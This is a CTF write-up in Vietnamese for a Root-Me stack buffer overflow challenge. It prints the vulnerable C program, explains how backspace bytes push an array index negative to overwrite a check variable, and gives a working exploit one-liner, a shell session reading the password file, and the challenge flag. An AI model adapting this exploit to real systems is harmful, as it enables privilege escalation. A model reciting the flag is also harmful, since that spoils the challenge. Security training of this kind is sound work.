
# Co-che-hoat-dong-cua-ma-doc - challenge 4 CTF Write up
```html
ELF x86 - Stack buffer overflow basic 3: ssh -p 2222 app-systeme-ch16@challenge02.root-me.org
```

![image](https://user-images.githubusercontent.com/64201705/120091248-8db6ea80-c133-11eb-993a-fd84265441be.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
```
Ta sẽ được như này:
![image](https://user-images.githubusercontent.com/64201705/120091265-b6d77b00-c133-11eb-8a3f-cb4150eba2a3.png)

```C
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void shell(void);

int main()
{

  char buffer[64];
  int check;
  int i = 0;
  int count = 0;

  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}

void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```
Đối với challenge này, ta không thể ghi đè biến check bằng giá trị `0xbffffabc` theo cách đơn giản mà ta vẫn thường làm vì các kí tự nhập vào đều được chương trình xử lí.
Nhưng ở đây, ta thấy khi ta nhập các kí tự khác với `0x08` thì biến count sẽ tăng lên, còn nếu nhập vào kí tự `0x08` thì biến count sẽ bị giảm xuống.
Mặt khác ta nhìn vào phần khai báo và case default của switch case, ta thấy `buffer[count] = i`, mà i được lại được khai báo là kiểu integer tức i sẽ được cấp 4 bytes trong bộ nhớ. Vì thế ta sẽ nghĩ tới việc nếu biến count mang giá trị là `-4` thì liệu `buffer[count]` có trỏ tới biến check ở trong stack hay không? Hãy cùng thử và xem kết quả!
- Ta sẽ giảm biến count xuống -4 và in giá trị `0xbffffabc` ra để ghi đè lên biến check bằng đoạn payload: `cat <(python -c 'print "\x08"*4+"\xbc\xfa\xff\xbf"') - | ./ch16`
![image](https://user-images.githubusercontent.com/64201705/120091403-08ccd080-c135-11eb-9643-8260fb88dd74.png)
```bash
app-systeme-ch16@challenge02:~$ cat <(python -c 'print "\x08"*4+"\xbc\xfa\xff\xbf"') - | ./ch16
Enter your name: LeDung
/bin/bash: line 2: LeDung: command not found
ls
Makefile  ch16  ch16.c
id
uid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)
cat .passwd
cat: '.p'$'\303''asswd': No such file or directory
cat .passwd
Sm4shM3ify0uC4n
```
Thành công!
Vậy flag là: 
## Sm4shM3ify0uC4n



